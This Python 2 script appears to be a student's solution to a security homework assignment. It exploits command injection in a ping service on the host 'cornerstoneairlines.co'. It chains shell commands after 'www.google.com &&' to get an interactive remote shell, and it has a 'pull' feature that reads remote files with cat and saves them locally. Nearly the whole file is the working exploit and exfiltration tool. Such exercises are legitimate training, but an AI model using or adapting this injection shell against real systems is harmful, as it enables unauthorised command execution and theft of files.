"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import re
import time
import sys
import os

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(path_str, cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)

    formatt_cmd = "www.google.com && cd " + str(path_str) + " && echo \"|\" && " + str(cmd) + " && echo \"|\" && pwd\n"

    s.send(formatt_cmd)

    time.sleep(3)

    data = s.recv(4096)
    return_str = re.search('min\/avg\/max\/mdev = \S* ms \| (.*)\| (.*)', data)

    new_path = path_str
    cmd_return = ""
    if return_str != None:
        cmd_return = re.search('min\/avg\/max\/mdev = \S* ms \| (.*)\| (.*)', data).group(1)
        new_path   = re.search('min\/avg\/max\/mdev = \S* ms \| (.*)\| (.*)', data).group(2)
    s.close()
    return (new_path, cmd_return)

def pull_cmd(remote_path, local_path):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    data = s.recv(1024)

    #formatt_cmd = "www.google.com && cat " + str(remote_path) + " " + str(local_path) + "\n"
    formatt_cmd = "www.google.com && cat " + str(remote_path) + "\n";

    s.send(formatt_cmd)

    time.sleep(3)

    data = s.recv(20480)
    return_str = re.search('min\/avg\/max\/mdev = \S* ms (.*)', data)
    if return_str == None:
        return ""
    file_return = return_str.group(1)
    #print(file_return)

    try:
        with open(local_path, 'wb') as temp_file:
            temp_file.write(file_return)
    except:
        if (local_path[-1:] == '/'):
            local_path = local_path + "default.txt"
        else:
            local_path = local_path + "/default.txt"
        with open(local_path, 'wb') as temp_file:
            temp_file.write(file_return)

    s.close()
    return file_return

if __name__ == '__main__':
    sys.stdout.write("> ")
    sys.stdout.flush()
    cmd_str = raw_input("")
    while(cmd_str != "exit"):
        if(cmd_str == "shell"):
            current_path = "/"
            sys.stdout.write(str(current_path) + "> ")
            sys.stdout.flush()
            shell_str = raw_input("")
            while(shell_str != "quit"):
                (current_path, return_str) = execute_cmd(current_path, shell_str)
                print(" " + str(return_str) + "\n")
                sys.stdout.write(str(current_path) + "> ")
                sys.stdout.flush()
                shell_str = raw_input("")
        elif(re.match("pull (\S*) (\S*)", cmd_str)):
            remote_path = re.search("pull (\S*) (\S*)", cmd_str).group(1)
            local_path  = re.search("pull (\S*) (\S*)", cmd_str).group(2)
            pull_cmd(remote_path, local_path)
        elif(cmd_str != "exit"):
            print("1. shell Drop into an interactive shell and allow users to gracefully exit")
            print("2. pull <remote-path> <local-path> Download files")
            print("3. help Shows this help menu")
            print("4. quit Quit the shell")
        print("")
        sys.stdout.write("> ")
        sys.stdout.flush()
        cmd_str = raw_input("")

    '''
    print("> shell")
    current_path = "/"
    sys.stdout.write(str(current_path) + "> ") 
    sys.stdout.flush()
    cmd_str = raw_input("")
    while(cmd_str != "quit"):
        (current_path, command_str) = execute_cmd(current_path, cmd_str);
        print(" " + str(command_str) + "\n")
        sys.stdout.write(str(current_path) + "> ")
        sys.stdout.flush()
        cmd_str = raw_input("")
    '''
